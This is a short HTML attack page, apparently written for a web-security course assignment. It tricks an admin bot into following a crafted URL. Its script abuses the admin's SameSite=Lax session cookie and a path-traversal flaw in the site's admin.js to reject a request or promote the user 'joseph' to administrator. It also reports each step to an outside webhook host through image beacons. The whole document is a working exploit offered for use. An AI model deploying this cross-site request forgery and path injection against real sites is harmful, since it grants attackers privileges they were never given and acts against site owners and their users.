<!doctype html>

<head><meta charset="utf-8"></head>

<script>
// v7: external-page delivery of the admin.js path injection.
// The bot opens this page (proven: D1 + yesterday's beacon). A top-level
// navigation to the challenge URL carries the admin's SameSite=Lax `sid`
// cookie (lecture 8: Lax allows cookies on safe-method top-level navigations).
// admin.js then builds fetch paths from the unvalidated `?request=` param.
//   ?t=reject7  -> POST api/requests/7/reject  (VISIBLE oracle: request #7
//                 flips to "rejected" in joseph's own Requests table)
//   ?t=promote  -> POST api/users/joseph/promote (the win)
var W = 'https://swift-stream-09.webhook.cool';
var BASE = 'https://10.20.18.55:2070/labs/assignment03/environment/1/';

function log(tag) {
  try { new Image().src = W + '/c1?tag=' + tag + '&t=' + Date.now(); } catch (e) {}
}

var mode = new URLSearchParams(location.search).get('t') || 'reject7';
var rid  = new URLSearchParams(location.search).get('r') || '7';

var target;
if (mode === 'promote') {
  target = BASE + '?view=admin&request=../users/joseph/promote?/seen';
  log('nav-promote');
} else {
  target = BASE + '?view=admin&request=../requests/' + encodeURIComponent(rid) + '/reject?/seen';
  log('nav-reject-' + rid);
}

setTimeout(function () { location.replace(target); }, 400);
</script>
